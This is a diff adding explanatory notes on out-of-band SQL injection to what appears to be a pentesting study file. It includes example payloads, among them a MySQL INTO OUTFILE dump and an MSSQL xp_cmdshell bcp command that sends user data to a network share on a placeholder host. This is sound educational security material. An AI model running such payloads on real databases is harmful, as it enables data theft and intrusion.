@@ -518,7 +518,47 @@ d) We cannot bypass SELECT keyword filter
 
 c
 
+## Out-of-band SQL Injection
 
+Out-of-band (OOB) SQL injection is an attack technique that pentester/red teamers use to exfiltrate data or execute malicious actions when direct or traditional methods are ineffective.
+
+Exfiltrate means to secretly take or extract data from a system and send it somewhere else, usually to an attacker-controlled location.
+
+Unlike In-band SQL injection, where the attacker relies on the same channel for attack and data retrieval, Out-of-band SQL injection utilises separate channels for sending the payload and receiving the response. Out-of-band techniques leverage features like HTTP requests, DNS queries, SMB protocol, or other network protocols that the database server might have access to, enabling attackers to circumvent firewalls, intrusion detection systems, and other security measures.
+
+Circumvent firewalls means bypass the firewall's security rules or restrictions so that traffic or communication that would normally be blocked can get through.
+
+One of the key advantages of Out-of-band SQL injection is its stealth and reliability. By using different communication channels, attackers can minimise the risk of detection and maintain a persistent connection with the compromised system. 
+
+Stealth means staying hidden or avoiding detection.
+
+For instance, an attacker might inject a SQL payload that triggers the database server to make a DNS request to a malicious domain controlled by the attacker. The response can then be used to extract sensitive data without alerting security mechanisms that monitor direct database interactions. This method allows attackers to exploit vulnerabilities even in complex network environments where direct connectivity between the attacker and the target is limited or scrutinised. 
+
+---
+
+### Techniques in Different Databases
+
+Out-of-band SQL injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:
+
+**MySQL and MariaDB**
+
+In MySQL or MariaDB, Out-of-band SQL injection can be achieved using `SELECT ... INTO OUTFILE` or `load_file` command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
+
+```
+SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
+```
+
+An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
+
+**Microsoft SQL Server (MSSQL)**
+
+In MSSQL, Out-of-band SQL injection can be performed using features like `xp_cmdshell`, which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:
+
+```
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\MACHINE_IP\logs\out.txt" -c -T';
+```
+
+Alternatively, `OPENROWSET` or `BULK INSERT` can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
 
 
 
